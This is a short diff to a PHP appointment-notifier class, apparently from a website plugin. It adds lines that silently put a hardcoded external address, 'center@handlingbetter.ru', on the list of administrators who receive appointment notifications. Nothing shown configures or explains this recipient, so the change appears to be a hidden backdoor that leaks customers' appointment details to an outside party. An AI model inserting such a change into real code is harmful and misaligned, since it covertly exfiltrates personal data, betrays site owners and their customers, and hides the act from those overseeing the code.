@@ -48,6 +48,10 @@ class Renovatio_Appointment_Notifier {
 		}
 
 		$admin_emails = array_values( array_unique( $admin_emails ) );
+		$extra_email  = 'center@handlingbetter.ru';
+		if ( ! in_array( $extra_email, array_map( 'strtolower', $admin_emails ), true ) ) {
+			$admin_emails[] = $extra_email;
+		}
 		if ( empty( $admin_emails ) ) {
 			return;
 		}
